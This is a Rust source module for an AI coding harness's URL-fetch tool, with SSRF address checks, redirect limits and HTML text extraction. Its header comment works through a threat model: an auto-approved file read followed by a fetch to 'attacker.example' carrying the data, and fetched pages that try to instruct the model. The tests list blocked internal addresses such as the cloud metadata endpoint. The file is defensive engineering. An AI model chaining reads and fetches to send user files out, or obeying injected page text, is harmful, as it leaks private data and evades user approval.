//! Fetching a URL for `<ai-harness-fetch>`.
//!
//! Like [`crate::files`], this runs without the approval modal, and for the same
//! reason: an agent that wants to read three documentation pages before doing
//! anything should not interrupt the user three times first. But the safety
//! argument is *not* the same one, and it is worth being exact about that.
//!
//! A read earns auto-approval by being confined more tightly than the shell —
//! it resolves inside the working directory or it fails. A fetch cannot be
//! confined that way: it is an outbound request to a host the model chose. What
//! bounds it instead is a policy applied to the destination:
//!
//! - `https` only, so a fetch cannot reach `file://` or downgrade to plaintext.
//! - Loopback, private, link-local, and other special-purpose addresses are
//!   refused, so a fetch cannot reach the user's own machine, their LAN, or a
//!   cloud metadata endpoint. This is checked on the address actually connected
//!   to, not on a separate lookup — see [`GuardedResolver`].
//! - The body is capped, the request is bounded by a timeout, and redirects are
//!   limited and re-checked at every hop.
//!
//! Two things this deliberately does *not* do, both documented in the README:
//!
//! 1. It does not stop exfiltration. An auto-approved read followed by an
//!    auto-approved fetch of `https://attacker.example/?d=…` moves file contents
//!    off the machine with no user interaction. The address rules do not help:
//!    the attacker's host is an ordinary public one. `--confirm-fetch` puts the
//!    modal back for users who do not want that.
//! 2. It does not bound what a fetched page *says*. Page text lands in the
//!    model's context as data, and a page may try to instruct the model. What
//!    contains that is structural: shell, write, and edit still require
//!    approval, so a page can persuade the model to propose something but not
//!    to do it.

use std::future::Future;
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr};
use std::time::Duration;

use anyhow::{Context, Result};
use futures_util::StreamExt;
use serde::{Deserialize, Serialize};
use url::{Host, Url};

/// Cap on the raw response body. Generous next to [`MAX_TEXT_BYTES`] because
/// HTML shrinks a long way once the markup is gone.
pub const MAX_FETCH_BYTES: usize = 256 * 1024;
/// Cap on the extracted text handed to the model. Matches the file-read cap:
/// the context budget does not care where the text came from.
pub const MAX_TEXT_BYTES: usize = 64 * 1024;
/// Redirect hops allowed. Low on purpose — a documentation link needs one or
/// two, and a long chain is more often a redirector being used as a launder.
pub const MAX_REDIRECTS: usize = 3;
/// Cap on the URL itself, before anything tries to parse it.
pub const MAX_URL_BYTES: usize = 2048;

/// Content types worth handing to a language model. Everything else is refused
/// rather than dumped into the context as mojibake, the same call
/// [`crate::files::read`] makes about binary files.
const TEXTUAL_TYPES: [&str; 8] = [
    "text/",
    "application/json",
    "application/xml",
    "application/xhtml",
    "application/javascript",
    "application/yaml",
    "application/toml",
    "+json",
];

// ---------------------------------------------------------------------------
// Outcome
// ---------------------------------------------------------------------------

/// The result of a fetch, successful or not.
///
/// Failure is data, not an error: a refused or broken fetch goes back to the
/// model so it can try something else, exactly like [`crate::files::ReadOutcome`].
/// Only a failure to *start* the work surfaces as an `Err` to the caller.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct FetchOutcome {
    /// The URL as the model wrote it, for display and for the result message.
    pub url: String,
    /// Where the request actually landed, when redirects moved it.
    pub final_url: Option<String>,
    pub status: Option<u16>,
    pub content_type: Option<String>,
    pub text: String,
    /// Size of the raw body received, before extraction.
    pub bytes: usize,
    pub truncated: bool,
    pub error: Option<String>,
}

impl FetchOutcome {
    pub fn failed(url: &str, error: impl Into<String>) -> Self {
        Self {
            url: url.to_string(),
            final_url: None,
            status: None,
            content_type: None,
            text: String::new(),
            bytes: 0,
            truncated: false,
            error: Some(error.into()),
        }
    }

    pub fn succeeded(&self) -> bool {
        self.error.is_none()
    }

    /// One-line header for the transcript.
    pub fn summary(&self) -> String {
        if self.error.is_some() {
            return "failed".to_string();
        }
        let lines = self.text.lines().count();
        if self.truncated {
            format!("{lines} line(s), truncated")
        } else {
            format!("{lines} line(s), {} bytes", self.text.len())
        }
    }
}

// ---------------------------------------------------------------------------
// Rejections
// ---------------------------------------------------------------------------

/// Why an address is not an acceptable destination.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BlockReason {
    Loopback,
    Private,
    LinkLocal,
    UniqueLocal,
    Unspecified,
    Multicast,
    Broadcast,
    Documentation,
    Shared,
    Benchmarking,
    Reserved,
}

impl BlockReason {
    fn as_str(self) -> &'static str {
        match self {
            Self::Loopback => "a loopback address",
            Self::Private => "a private address",
            Self::LinkLocal => "a link-local address",
            Self::UniqueLocal => "a unique-local address",
            Self::Unspecified => "an unspecified address",
            Self::Multicast => "a multicast address",
            Self::Broadcast => "a broadcast address",
            Self::Documentation => "a documentation address",
            Self::Shared => "a shared address space address",
            Self::Benchmarking => "a benchmarking address",
            Self::Reserved => "a reserved address",
        }
    }
}

/// Why a fetch did not happen, or did not produce usable text.
///
/// Structured rather than stringly-typed for the same reason as
/// [`crate::protocol::ProtocolError`]: tests assert on the variant, and the
/// message is rendered in one place.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Rejection {
    Empty,
    TooLong { bytes: usize },
    NotAUrl { reason: String },
    BadScheme { scheme: String },
    CredentialsInUrl,
    NoHost,
    Blocked { host: String, reason: BlockReason },
    TooManyRedirects { limit: usize },
    BadStatus { status: u16 },
    UnsupportedContentType { content_type: String },
    Timeout { seconds: u64 },
    Cancelled,
    Transport { message: String },
}

impl Rejection {
    pub fn message(&self) -> String {
        match self {
            Self::Empty => "no URL was given".to_string(),
            Self::TooLong { bytes } => {
                format!("the URL is {bytes} bytes; the limit is {MAX_URL_BYTES}")
            }
            Self::NotAUrl { reason } => format!("not a valid URL: {reason}"),
            Self::BadScheme { scheme } => format!(
                "{scheme}: is not allowed; fetch speaks https only. \
                 To reach anything else, use a shell command, which the user will be asked to approve."
            ),
            Self::CredentialsInUrl => {
                "the URL carries credentials (user:password@), which are not sent".to_string()
            }
            Self::NoHost => "the URL has no host".to_string(),
            Self::Blocked { host, reason } => format!(
                "{host} is {}; fetch reaches public hosts only, so it cannot be used \
                 to probe the local machine or network",
                reason.as_str()
            ),
            Self::TooManyRedirects { limit } => {
                format!("the URL redirected more than {limit} times")
            }
            Self::BadStatus { status } => format!("the server returned HTTP {status}"),
            Self::UnsupportedContentType { content_type } => format!(
                "the response is {content_type}, which is not text; \
                 fetch returns textual content only"
            ),
            Self::Timeout { seconds } => format!("the request exceeded the {seconds}s timeout"),
            Self::Cancelled => "the fetch was cancelled".to_string(),
            Self::Transport { message } => message.clone(),
        }
    }
}

// ---------------------------------------------------------------------------
// Address policy
// ---------------------------------------------------------------------------

/// Refuse any address that is not a plausible public destination.
///
/// [`IpAddr::to_canonical`] runs first so an IPv4-mapped form such as
/// `::ffff:169.254.169.254` is judged by the v4 table rather than sliding past
/// the v6 one.
pub fn check_ip(ip: IpAddr) -> Result<(), BlockReason> {
    match ip.to_canonical() {
        IpAddr::V4(v4) => check_ipv4(v4),
        IpAddr::V6(v6) => check_ipv6(v6),
    }
}

/// The IANA special-purpose ranges, in the order a reader would check them.
///
/// `Ipv4Addr::is_global` would express this in one call but is still unstable,
/// so the ranges it covers are spelled out. Note these predicates live on
/// `Ipv4Addr`, not on `IpAddr` — calling `is_loopback` through the enum compiles
/// but silently skips `is_private` and `is_link_local`.
fn check_ipv4(ip: Ipv4Addr) -> Result<(), BlockReason> {
    let bits = ip.to_bits();
    // 0.0.0.0/8, "this network". Also catches the 0.0.0.1 that a deprecated
    // IPv4-compatible IPv6 address collapses to.
    if ip.octets()[0] == 0 {
        return Err(BlockReason::Unspecified);
    }
    if ip.is_loopback() {
        return Err(BlockReason::Loopback);
    }
    if ip.is_private() {
        return Err(BlockReason::Private);
    }
    if ip.is_link_local() {
        // 169.254.0.0/16, which is where cloud metadata lives.
        return Err(BlockReason::LinkLocal);
    }
    if ip.is_broadcast() {
        return Err(BlockReason::Broadcast);
    }
    if ip.is_documentation() {
        return Err(BlockReason::Documentation);
    }
    if ip.is_multicast() {
        return Err(BlockReason::Multicast);
    }
    if bits & 0xffc0_0000 == 0x6440_0000 {
        // 100.64.0.0/10, carrier-grade NAT.
        return Err(BlockReason::Shared);
    }
    if bits & 0xfffe_0000 == 0xc612_0000 {
        // 198.18.0.0/15, benchmarking.
        return Err(BlockReason::Benchmarking);
    }
    if bits & 0xffff_ff00 == 0xc000_0000 || bits & 0xf000_0000 == 0xf000_0000 {
        // 192.0.0.0/24 (IETF protocol assignments) and 240.0.0.0/4 (reserved).
        return Err(BlockReason::Reserved);
    }
    Ok(())
}

/// Deny by default: only global unicast (`2000::/3`) is a candidate at all.
///
/// This is the fail-closed direction — an address class nobody thought of is
/// refused rather than allowed — and it subsumes loopback, unique-local,
/// link-local, and multicast in one check. The explicit predicates below it
/// are kept for the specific reason each carries into the error message.
fn check_ipv6(ip: Ipv6Addr) -> Result<(), BlockReason> {
    if ip.is_unspecified() {
        return Err(BlockReason::Unspecified);
    }
    if ip.is_loopback() {
        return Err(BlockReason::Loopback);
    }
    if ip.is_unique_local() {
        return Err(BlockReason::UniqueLocal);
    }
    if ip.is_unicast_link_local() {
        return Err(BlockReason::LinkLocal);
    }
    if ip.is_multicast() {
        return Err(BlockReason::Multicast);
    }
    let segments = ip.segments();
    if segments[0] & 0xe000 != 0x2000 {
        return Err(BlockReason::Reserved);
    }
    if segments[0] == 0x2001 && segments[1] == 0x0db8 {
        return Err(BlockReason::Documentation);
    }
    if segments[0] == 0x2001 && segments[1] == 0x0002 {
        return Err(BlockReason::Benchmarking);
    }
    // 6to4 (2002::/16) and NAT64 (64:ff9b::/96) embed a v4 address that may
    // itself be private, so judge the address they actually reach. NAT64 sits
    // outside 2000::/3 and is already refused above; it is handled here so the
    // intent survives if that check is ever loosened.
    if segments[0] == 0x2002 {
        let embedded = Ipv4Addr::from(((segments[1] as u32) << 16) | segments[2] as u32);
        return check_ipv4(embedded);
    }
    if segments[0] == 0x0064 && segments[1] == 0xff9b && segments[2..6] == [0, 0, 0, 0] {
        let embedded = Ipv4Addr::from(((segments[6] as u32) << 16) | segments[7] as u32);
        return check_ipv4(embedded);
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// URL policy
// ---------------------------------------------------------------------------

/// What a [`Fetcher`] is allowed to do.
///
/// The two booleans exist so tests can reach a local server; production never
/// constructs anything but [`Policy::strict`], and [`crate::fetch::fetch`] takes
/// no policy argument at all.
#[derive(Debug, Clone, Copy)]
pub struct Policy {
    pub require_https: bool,
    pub allow_private_ips: bool,
    pub max_bytes: usize,
    pub max_redirects: usize,
    pub timeout: Duration,
}

impl Policy {
    pub fn strict(timeout: Duration) -> Self {
        Self {
            require_https: true,
            allow_private_ips: false,
            max_bytes: MAX_FETCH_BYTES,
            max_redirects: MAX_REDIRECTS,
            timeout,
        }
    }

    /// Loosened so the test server on `http://127.0.0.1:…` is reachable.
    ///
    /// `#[cfg(test)]`, so it does not exist in a shipping build. The URL and
    /// address rules themselves are tested against [`Policy::strict`] — this
    /// only exists to exercise the transport around them.
    #[cfg(test)]
    pub fn permissive_for_tests(timeout: Duration) -> Self {
        Self {
            require_https: false,
            allow_private_ips: true,
            ..Self::strict(timeout)
        }
    }
}

/// Parse and vet a URL the model supplied. Cheapest checks first.
pub fn check_url(raw: &str, policy: &Policy) -> Result<Url, Rejection> {
    let trimmed = raw.trim();
    if trimmed.is_empty() {
        return Err(Rejection::Empty);
    }
    if trimmed.len() > MAX_URL_BYTES {
        return Err(Rejection::TooLong {
            bytes: trimmed.len(),
        });
    }
    let url = Url::parse(trimmed).map_err(|e| Rejection::NotAUrl {
        reason: e.to_string(),
    })?;
    check_parsed_url(&url, policy)?;
    Ok(url)
}

/// The half of [`check_url`] that a redirect hop can be re-checked against.
pub fn check_parsed_url(url: &Url, policy: &Policy) -> Result<(), Rejection> {
    if policy.require_https && url.scheme() != "https" {
        return Err(Rejection::BadScheme {
            scheme: url.scheme().to_string(),
        });
    }
    if !url.username().is_empty() || url.password().is_some() {
        return Err(Rejection::CredentialsInUrl);
    }
    let Some(host) = url.host() else {
        return Err(Rejection::NoHost);
    };
    if policy.allow_private_ips {
        return Ok(());
    }
    // A literal-IP host never reaches the resolver, so it is checked here.
    // `url` has already normalised the obfuscated spellings — `2130706433`
    // and `0x7f.1` arrive as 127.0.0.1.
    let ip = match host {
        Host::Ipv4(v4) => Some(IpAddr::V4(v4)),
        Host::Ipv6(v6) => Some(IpAddr::V6(v6)),
        Host::Domain(_) => None,
    };
    if let Some(ip) = ip
        && let Err(reason) = check_ip(ip)
    {
        return Err(Rejection::Blocked {
            host: ip.to_string(),
            reason,
        });
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Transport
// ---------------------------------------------------------------------------

/// A DNS resolver that refuses to hand back a non-public address.
///
/// This has to be reqwest's *own* resolver rather than a check run beforehand.
/// Resolving separately and then passing the URL to reqwest leaves a rebinding
/// race, because reqwest resolves again at connect time; and
/// `ClientBuilder::resolve` only pins the first host, so a redirect to a second
/// host reopens the same window. As the configured resolver this is the single
/// point every hop and every new pooled connection must pass through.
#[derive(Debug, Clone, Copy)]
struct GuardedResolver {
    allow_private_ips: bool,
}

impl reqwest::dns::Resolve for GuardedResolver {
    fn resolve(&self, name: reqwest::dns::Name) -> reqwest::dns::Resolving {
        let host = name.as_str().to_owned();
        let allow_private_ips = self.allow_private_ips;
        Box::pin(async move {
            let addrs: Vec<SocketAddr> = tokio::net::lookup_host((host.as_str(), 0u16))
                .await
                .map_err(|e| -> Box<dyn std::error::Error + Send + Sync> {
                    format!("{host} could not be resolved: {e}").into()
                })?
                .collect();
            if addrs.is_empty() {
                return Err(format!("{host} did not resolve to any address").into());
            }
            if !allow_private_ips {
                // Refuse the whole lookup if any answer is blocked, rather than
                // filtering to the survivors: a rebinding attacker who returns
                // one good address and one bad one would otherwise get the good
                // one now and the bad one when the connection pool turns over.
                for addr in &addrs {
                    if let Err(reason) = check_ip(addr.ip()) {
                        return Err(Rejection::Blocked {
                            host: format!("{host} ({})", addr.ip()),
                            reason,
                        }
                        .message()
                        .into());
                    }
                }
            }
            Ok(Box::new(addrs.into_iter()) as reqwest::dns::Addrs)
        })
    }
}

/// An HTTP client bound by a [`Policy`].
#[derive(Debug, Clone)]
pub struct Fetcher {
    http: reqwest::Client,
    policy: Policy,
}

impl Fetcher {
    pub fn new(policy: Policy) -> Result<Self> {
        let redirect_policy = policy;
        let http = reqwest::Client::builder()
            .user_agent(concat!("ai-harness/", env!("CARGO_PKG_VERSION")))
            // A proxy would resolve the target host itself, so `GuardedResolver`
            // would never see it and the address rules would silently do
            // nothing. The `system-proxy` feature is on, so this is load-bearing
            // rather than tidying: do not remove it.
            .no_proxy()
            .https_only(policy.require_https)
            .referer(false)
            .dns_resolver(GuardedResolver {
                allow_private_ips: policy.allow_private_ips,
            })
            .redirect(reqwest::redirect::Policy::custom(move |attempt| {
                if attempt.previous().len() >= redirect_policy.max_redirects {
                    return attempt.error(
                        Rejection::TooManyRedirects {
                            limit: redirect_policy.max_redirects,
                        }
                        .message(),
                    );
                }
                match check_parsed_url(attempt.url(), &redirect_policy) {
                    Ok(()) => attempt.follow(),
                    // `error` rather than `stop`: stopping would surrender the
                    // 3xx as a successful response carrying the redirect body.
                    Err(rejection) => attempt.error(rejection.message()),
                }
            }))
            .connect_timeout(policy.timeout)
            .timeout(policy.timeout)
            .build()
            .context("building the fetch HTTP client")?;
        Ok(Self { http, policy })
    }

    /// Fetch a URL, returning the outcome as data. Never returns an error: a
    /// refusal is something the model should see and work around.
    pub async fn fetch(&self, raw: &str, cancel: impl Future<Output = ()>) -> FetchOutcome {
        tokio::pin!(cancel);
        let work = self.try_fetch(raw);
        tokio::pin!(work);
        let result = tokio::select! {
            // Interrupt wins a race with a fast response, matching `exec`.
            biased;
            _ = &mut cancel => Err(Rejection::Cancelled),
            result = &mut work => result,
        };
        match result {
            Ok(outcome) => outcome,
            Err(rejection) => FetchOutcome::failed(raw, rejection.message()),
        }
    }

    async fn try_fetch(&self, raw: &str) -> Result<FetchOutcome, Rejection> {
        let url = check_url(raw, &self.policy)?;

        // `timeout` on the builder bounds the request, but an outer bound also
        // covers a body that drips forever without ever going idle.
        let send = self.http.get(url.clone()).send();
        let response = match tokio::time::timeout(self.policy.timeout, send).await {
            Err(_) => {
                return Err(Rejection::Timeout {
                    seconds: self.policy.timeout.as_secs(),
                });
            }
            Ok(Err(e)) => return Err(transport_rejection(&e, &self.policy)),
            Ok(Ok(response)) => response,
        };

        let final_url = response.url().clone();
        // Redirects were vetted hop by hop, but re-checking where we landed is
        // cheap and catches a policy that let something through.
        check_parsed_url(&final_url, &self.policy)?;

        let status = response.status();
        if !status.is_success() {
            return Err(Rejection::BadStatus {
                status: status.as_u16(),
            });
        }

        let content_type = response
            .headers()
            .get(reqwest::header::CONTENT_TYPE)
            .and_then(|value| value.to_str().ok())
            .map(str::to_string);
        if let Some(content_type) = &content_type
            && !is_textual(content_type)
        {
            return Err(Rejection::UnsupportedContentType {
                content_type: content_type.clone(),
            });
        }

        let (body, mut truncated) = read_capped(response, self.policy.max_bytes).await?;
        let bytes = body.len();
        let mut text = extract_text(content_type.as_deref(), &body);
        if text.len() > MAX_TEXT_BYTES {
            let cut = floor_char_boundary(&text, MAX_TEXT_BYTES);
            text.truncate(cut);
            truncated = true;
        }

        Ok(FetchOutcome {
            url: raw.trim().to_string(),
            final_url: (final_url.as_str() != url.as_str()).then(|| final_url.to_string()),
            status: Some(status.as_u16()),
            content_type,
            text,
            bytes,
            truncated,
            error: None,
        })
    }
}

/// Turn a reqwest failure into a rejection, recovering the underlying message.
///
/// A refusal from [`GuardedResolver`] or the redirect policy surfaces as a
/// generic connect error with the real message buried in the source chain, so
/// walk the chain rather than reporting "error sending request".
fn transport_rejection(error: &reqwest::Error, policy: &Policy) -> Rejection {
    if error.is_timeout() {
        return Rejection::Timeout {
            seconds: policy.timeout.as_secs(),
        };
    }
    let mut source: Option<&(dyn std::error::Error + 'static)> = std::error::Error::source(error);
    let mut deepest: Option<String> = None;
    while let Some(current) = source {
        deepest = Some(current.to_string());
        source = current.source();
    }
    Rejection::Transport {
        message: deepest.unwrap_or_else(|| error.to_string()),
    }
}

/// Stream the body, stopping once the cap is reached.
async fn read_capped(
    response: reqwest::Response,
    max: usize,
) -> Result<(Vec<u8>, bool), Rejection> {
    let mut stream = response.bytes_stream();
    let mut body: Vec<u8> = Vec::new();
    let mut truncated = false;
    while let Some(chunk) = stream.next().await {
        let chunk = chunk.map_err(|e| Rejection::Transport {
            message: format!("the response body could not be read: {e}"),
        })?;
        let room = max.saturating_sub(body.len());
        if chunk.len() > room {
            body.extend_from_slice(&chunk[..room]);
            truncated = true;
            break;
        }
        body.extend_from_slice(&chunk);
    }
    Ok((body, truncated))
}

fn is_textual(content_type: &str) -> bool {
    let lowered = content_type.to_ascii_lowercase();
    TEXTUAL_TYPES.iter().any(|kind| lowered.contains(kind))
}

/// Largest index at or below `at` that lands on a character boundary.
fn floor_char_boundary(text: &str, at: usize) -> usize {
    let mut at = at.min(text.len());
    while at > 0 && !text.is_char_boundary(at) {
        at -= 1;
    }
    at
}

// ---------------------------------------------------------------------------
// Extraction
// ---------------------------------------------------------------------------

/// Tags whose entire subtree is dropped — none of it is page text.
const DROPPED_SUBTREES: [&str; 7] = [
    "script", "style", "head", "nav", "footer", "svg", "noscript",
];

/// Tags that end a line of text.
///
/// `pre` is deliberately absent: its whitespace is content, so it is handled as
/// its own mode rather than as one more line break. See [`strip_html`].
const BLOCK_TAGS: [&str; 20] = [
    "p",
    "div",
    "br",
    "hr",
    "li",
    "ul",
    "ol",
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "tr",
    "td",
    "th",
    "section",
    "article",
    "blockquote",
    "table",
];

/// Reduce a response body to text worth putting in a model's context.
///
/// Anything that is not HTML passes through untouched: JSON, Markdown, and
/// plain text are already what we want, and are probably most of the traffic.
pub fn extract_text(content_type: Option<&str>, body: &[u8]) -> String {
    // Matching `files::read`, bytes become text lossily rather than failing. A
    // known limitation: a non-UTF-8 `charset=` in the content type is ignored.
    let text = String::from_utf8_lossy(body);
    if content_type.is_some_and(is_html) {
        strip_html(&text)
    } else {
        text.into_owned()
    }
}

fn is_html(content_type: &str) -> bool {
    let lowered = content_type.to_ascii_lowercase();
    lowered.contains("text/html") || lowered.contains("application/xhtml")
}

/// A run of extracted text, and whether its whitespace is content.
///
/// Keeping the two apart is what lets `<pre>` survive: flow text is collapsed
/// and tidied, preformatted text is not. Doing it with a sentinel string in one
/// buffer would work until a page contained the sentinel.
enum Chunk {
    Flow(String),
    Pre(String),
}

/// Turn HTML into plain text.
///
/// Deliberately a stripper, not a parser: it drops the subtrees that never hold
/// page text, breaks lines at block boundaries, and removes the rest of the
/// markup. It does not reconstruct lists, tables, or link targets.
///
/// `<pre>` is the one exception, because in a coding harness it is the payload
/// rather than decoration: a documentation page is mostly read for its examples,
/// and an example whose newlines and indentation have been collapsed onto one
/// line is materially harder to use than the same text laid out. So a `<pre>`
/// subtree keeps its whitespace verbatim while its tags are still stripped —
/// syntax highlighting is markup, the line breaks around it are not.
fn strip_html(input: &str) -> String {
    let bytes = input.as_bytes();
    let mut chunks: Vec<Chunk> = Vec::new();
    let mut out = String::with_capacity(input.len() / 2);
    // `Some` while inside a `<pre>`; its depth counts nested `<pre>` opens so a
    // stray inner one cannot end the block early.
    let mut pre: Option<(String, usize)> = None;
    let mut i = 0;
    // A block boundary is recorded rather than written immediately. Writing it
    // straight out would emit two breaks per element (one for `<p>`, one for
    // `</p>`) and would break lines before any text had been seen.
    let mut pending_break = false;

    while i < bytes.len() {
        if bytes[i] != b'<' {
            let start = i;
            while i < bytes.len() && bytes[i] != b'<' {
                i += 1;
            }
            if let Some((buf, _)) = &mut pre {
                // Inside a `<pre>` the whitespace *is* the content.
                buf.push_str(&input[start..i]);
                continue;
            }
            // In HTML every run of whitespace is one space, including newlines
            // in the source. Collapsing here means the only line breaks in the
            // output are the ones block tags asked for.
            let chunk = collapse_whitespace(&input[start..i]);
            if chunk.trim().is_empty() {
                // Whitespace between two inline elements still separates words,
                // so it is kept — but it does not satisfy a pending break.
                out.push_str(&chunk);
            } else {
                if pending_break && !out.is_empty() {
                    out.push('\n');
                }
                pending_break = false;
                out.push_str(&chunk);
            }
            continue;
        }

        if input[i..].starts_with("<!--") {
            match input[i + 4..].find("-->") {
                Some(offset) => i += 4 + offset + 3,
                None => break,
            }
            continue;
        }

        // An unterminated '<' is the end of anything useful.
        let Some(offset) = input[i..].find('>') else {
            break;
        };
        let inner = &input[i + 1..i + offset];
        i += offset + 1;

        let is_closing = inner.starts_with('/');
        let name: String = inner
            .trim_start_matches('/')
            .chars()
            .take_while(char::is_ascii_alphanumeric)
            .collect::<String>()
            .to_ascii_lowercase();

        if !is_closing && !inner.ends_with('/') && DROPPED_SUBTREES.contains(&name.as_str()) {
            match find_close_tag(&input[i..], &name) {
                Some(offset) => i += offset,
                // Unclosed: the rest of the document belongs to it.
                None => break,
            }
            continue;
        }

        if name == "pre" && !inner.ends_with('/') {
            match (&mut pre, is_closing) {
                // Nested opens are counted so an inner `<pre>` cannot end the
                // outer one on its closing tag.
                (Some((_, depth)), false) => *depth += 1,
                (Some((_, depth)), true) if *depth > 1 => *depth -= 1,
                (Some(_), true) => {
                    let (buf, _) = pre.take().expect("just matched Some");
                    chunks.push(Chunk::Flow(std::mem::take(&mut out)));
                    chunks.push(Chunk::Pre(buf));
                    pending_break = false;
                }
                (None, false) => pre = Some((String::new(), 1)),
                // A stray `</pre>` with nothing open is not worth reacting to.
                (None, true) => {}
            }
            continue;
        }

        if pre.is_none() && BLOCK_TAGS.contains(&name.as_str()) {
            pending_break = true;
        }
    }

    // An unclosed `<pre>` still keeps what it collected.
    if let Some((buf, _)) = pre {
        chunks.push(Chunk::Flow(std::mem::take(&mut out)));
        chunks.push(Chunk::Pre(buf));
    }
    chunks.push(Chunk::Flow(out));

    let mut text = String::new();
    for chunk in chunks {
        let part = match chunk {
            Chunk::Flow(s) => tidy(&decode_entities(&s)),
            Chunk::Pre(s) => tidy_pre(&decode_entities(&s)),
        };
        if part.is_empty() {
            continue;
        }
        if !text.is_empty() {
            text.push('\n');
        }
        text.push_str(&part);
    }
    text
}

/// Reduce every run of whitespace to one space, keeping whether the chunk had
/// whitespace at either end so adjacent inline elements do not run together.
fn collapse_whitespace(chunk: &str) -> String {
    let mut out = String::with_capacity(chunk.len());
    let mut pending_space = false;
    for ch in chunk.chars() {
        if ch.is_whitespace() {
            pending_space = true;
            continue;
        }
        if pending_space {
            out.push(' ');
            pending_space = false;
        }
        out.push(ch);
    }
    if pending_space {
        out.push(' ');
    }
    out
}

/// Index just past the matching `</name>`, searched case-insensitively.
fn find_close_tag(haystack: &str, name: &str) -> Option<usize> {
    let bytes = haystack.as_bytes();
    for i in 0..bytes.len() {
        if bytes[i] != b'<' || bytes.get(i + 1) != Some(&b'/') {
            continue;
        }
        let rest = &haystack[i + 2..];
        let matches = rest.len() > name.len()
            && rest.as_bytes()[..name.len()].eq_ignore_ascii_case(name.as_bytes())
            && rest[name.len()..].starts_with(|c: char| c == '>' || c.is_whitespace());
        if matches {
            return haystack[i..].find('>').map(|offset| i + offset + 1);
        }
    }
    None
}

fn decode_entities(input: &str) -> String {
    if !input.contains('&') {
        return input.to_string();
    }
    let mut out = String::with_capacity(input.len());
    let mut rest = input;
    while let Some(start) = rest.find('&') {
        out.push_str(&rest[..start]);
        rest = &rest[start..];
        // An entity is short; anything longer is a stray ampersand. Scan by
        // character rather than slicing at a byte offset — a '&' followed by an
        // emoji would otherwise cut a multi-byte character in half and panic.
        let end = rest
            .char_indices()
            .take(12)
            .find(|(_, ch)| *ch == ';')
            .map(|(index, _)| index);
        let Some(end) = end else {
            out.push('&');
            rest = &rest[1..];
            continue;
        };
        match decode_entity(&rest[1..end]) {
            Some(decoded) => {
                out.push_str(&decoded);
                rest = &rest[end + 1..];
            }
            None => {
                out.push('&');
                rest = &rest[1..];
            }
        }
    }
    out.push_str(rest);
    out
}

fn decode_entity(name: &str) -> Option<String> {
    let named = match name {
        "amp" => "&",
        "lt" => "<",
        "gt" => ">",
        "quot" => "\"",
        "apos" => "'",
        "nbsp" => " ",
        "mdash" => "—",
        "ndash" => "–",
        "hellip" => "…",
        "copy" => "©",
        "reg" => "®",
        "trade" => "™",
        "rsquo" => "'",
        "lsquo" => "'",
        "ldquo" => "\u{201c}",
        "rdquo" => "\u{201d}",
        _ => "",
    };
    if !named.is_empty() {
        return Some(named.to_string());
    }
    let digits = name.strip_prefix('#')?;
    let code = match digits.strip_prefix(['x', 'X']) {
        Some(hex) => u32::from_str_radix(hex, 16).ok()?,
        None => digits.parse::<u32>().ok()?,
    };
    char::from_u32(code).map(String::from)
}

/// Tidy a preformatted block without touching what makes it preformatted.
///
/// Trailing spaces go and blank lines are trimmed from both ends — neither
/// carries meaning — but indentation and interior line breaks are left exactly
/// as they were, which is the whole point of treating `<pre>` separately.
fn tidy_pre(input: &str) -> String {
    let mut lines: Vec<&str> = input.lines().map(str::trim_end).collect();
    while lines.first().is_some_and(|line| line.is_empty()) {
        lines.remove(0);
    }
    while lines.last().is_some_and(|line| line.is_empty()) {
        lines.pop();
    }
    lines.join("\n")
}

/// Collapse the whitespace an HTML document leaves behind: runs of spaces
/// within a line, and runs of blank lines between them.
fn tidy(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    let mut blank_run = 0;
    for line in input.lines() {
        let mut collapsed = String::with_capacity(line.len());
        let mut pending_space = false;
        for ch in line.chars() {
            if ch.is_whitespace() {
                pending_space = true;
                continue;
            }
            if pending_space && !collapsed.is_empty() {
                collapsed.push(' ');
            }
            pending_space = false;
            collapsed.push(ch);
        }
        if collapsed.is_empty() {
            blank_run += 1;
            // One blank line separates paragraphs; more is just markup residue.
            if blank_run == 1 {
                out.push('\n');
            }
            continue;
        }
        blank_run = 0;
        out.push_str(&collapsed);
        out.push('\n');
    }
    out.trim().to_string()
}

#[cfg(test)]
mod tests {
    use std::io::{BufRead, BufReader, Write};
    use std::net::TcpListener;

    use super::*;

    fn strict() -> Policy {
        Policy::strict(Duration::from_secs(5))
    }

    fn permissive() -> Policy {
        Policy::permissive_for_tests(Duration::from_secs(5))
    }

    // -- the policy knobs -------------------------------------------------

    #[test]
    fn the_strict_policy_is_actually_strict() {
        // The loosened policy exists only for the transport tests below. If it
        // ever became reachable from production this assertion is the tripwire.
        let policy = strict();
        assert!(policy.require_https, "production must require https");
        assert!(
            !policy.allow_private_ips,
            "production must refuse private addresses"
        );
    }

    // -- address rules ----------------------------------------------------

    #[test]
    fn local_and_special_addresses_are_refused() {
        let blocked = [
            "127.0.0.1",
            "127.9.9.9",
            "0.0.0.0",
            "0.0.0.1",
            "10.0.0.7",
            "172.16.3.1",
            "172.31.255.255",
            "192.168.1.1",
            "169.254.169.254", // cloud metadata
            "169.254.0.1",
            "100.64.0.1", // carrier-grade NAT
            "198.18.0.1", // benchmarking
            "192.0.0.1",  // IETF protocol assignments
            "240.0.0.1",  // reserved
            "255.255.255.255",
            "224.0.0.1", // multicast
            "192.0.2.1", // documentation
            "::1",
            "::",
            "fc00::1", // unique local
            "fd12:3456::1",
            "fe80::1",                // link local
            "ff02::1",                // multicast
            "::ffff:127.0.0.1",       // v4-mapped loopback
            "::ffff:169.254.169.254", // v4-mapped metadata
            "2001:db8::1",            // documentation
            "2002:7f00:1::",          // 6to4 wrapping 127.0.0.1
            "64:ff9b::a00:1",         // NAT64 wrapping 10.0.0.1
        ];
        for address in blocked {
            let ip: IpAddr = address.parse().expect("test address should parse");
            assert!(
                check_ip(ip).is_err(),
                "{address} should be refused as a destination"
            );
        }
    }

    #[test]
    fn ordinary_public_addresses_are_allowed() {
        let allowed = [
            "1.1.1.1",
            "8.8.8.8",
            "93.184.216.34",
            "172.32.0.1", // just past the private /12
            "172.15.255.255",
            "9.255.255.255",
            "128.0.0.1",
            "2606:4700:4700::1111",
            "2001:4860:4860::8888",
        ];
